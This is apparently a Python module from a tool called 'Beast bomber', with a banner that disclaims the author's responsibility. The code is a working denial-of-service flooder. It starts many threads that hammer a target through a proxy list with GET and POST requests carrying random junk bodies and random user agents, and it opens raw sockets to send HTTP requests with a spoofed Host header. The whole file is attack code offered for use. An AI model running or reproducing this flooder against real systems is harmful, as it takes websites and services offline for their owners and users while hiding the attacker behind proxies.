"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1cum                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2023 un1cum                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import time
import random
import socket
import struct
from requests import *
from threading import Thread
from fake_useragent import UserAgent


def start_ddos(threads, time_a, target, ports):
    for _ in range(threads):
        th = Thread(target=ddos_attack, args=(time_a, target, ports))
        th.start()


def ddos_attack(time_a, target, ports):
    t = time.monotonic()
    proxies = []
    ua = UserAgent()

    with open('input/proxies.txt', 'r') as file:
        for line in file:
            proxies.append(line.replace('\n', ''))

    while time.monotonic() - t < time_a:
        try:
            user = ua.random
            port = random.choice(ports)
            fake_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
            for proxy in proxies:
                proxy_2 = {
                    "http": "http://" + proxy,
                    "https": "https://" + proxy
                }
                lib = "1234567890qwertyuiop[]asdfghjkl;'zxcvbnm,./_"
                st = ''
                for _ in range(random.randint(10, 200)):
                    st += random.choice(lib)
                header = {'user-agent': user}

                try:
                    get(target, proxies=proxy_2)
                except:
                    pass
                try:
                    get(target, headers=header, proxies=proxy_2)
                except:
                    pass
                try:
                    post(target, data=st, headers=header, proxies=proxy_2)
                except:
                    pass
                try:
                    post(target, data=st, proxies=proxy_2)
                except:
                    pass
                try:
                    post(target, json=st, headers=header, proxies=proxy_2)
                except:
                    pass
                try:
                    post(target, json=st, proxies=proxy_2)
                except:
                    pass

                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                    s.close()
                except:
                    pass

        except:
            pass
